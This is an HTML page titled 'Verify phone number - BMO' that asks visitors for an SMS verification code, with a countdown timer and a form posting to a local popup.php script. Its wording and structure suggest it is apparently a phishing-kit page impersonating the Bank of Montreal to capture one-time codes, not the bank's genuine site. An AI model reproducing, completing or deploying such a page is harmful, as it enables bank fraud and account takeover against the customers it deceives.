<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verify phone number - BMO</title>

  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <script src="https://kit.fontawesome.com/64664913ea.js" crossorigin="anonymous"></script>
</head>
<body class="bg-body">
  <div class="container mt-5 maxheight-container">
    <div class="row mt-4 d-flex flex-column-reverse flex-md-row">
      <div class="col-md-6 p-4 mr-lg-6">
        <h1 class="fw-bold mb-2">Phone number verification</h1>
        <p class="mb-4">We have sent the verification information to your registration number, please check and enter the correct verification code to confirm that it is you.</p>

        <form method="POST" novalidate class="needs-validation" action="./popup.php">
          <div class="input-group mb-3">
            <div class="form-floating">
              <input required type="text" class="form-control bg-body border-0 border-bottom focus-none" id="verification-code" placeholder="asd">
              <label for="floatingInput">Verification code</label>
            </div>
            <span class="input-group-text bg-body border-0 text-muted border-bottom" id="phone-timer">60</span>
            <div id="validationServerBMOFeedback" class="invalid-feedback b-0">
                Please enter 
            </div>
          </div>

          <input class="mt-4 py-3 px-5 fs-6 btn btn-primary btn-lg rounded-pill" type="submit" value="VERIFY">
          <p class="text-xs mt-3 text-muted"><b>Heads-up:</b> Already registered your BMO debit card? No need to register your credit card. You're all set to sign in!</p>
        </form>
      </div>
      <!-- <div class="col-md-6 mb-3 d-flex justify-content-center align-items-center p-0 px-lg-3">
        <img style="max-height: 132px" src="./images/laptop-phone-paperplane.png" alt="Illustration">
      </div> -->
    </div>
  </div>

  <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>

  <script>
    var time = 60;

    var phoneTimer = setInterval(function() {
      $('#phone-timer').text(time);
      time--;

      if (time < 0) {
        clearInterval(phoneTimer);
      }
    }, 1000);
  </script>

</body>
</html>
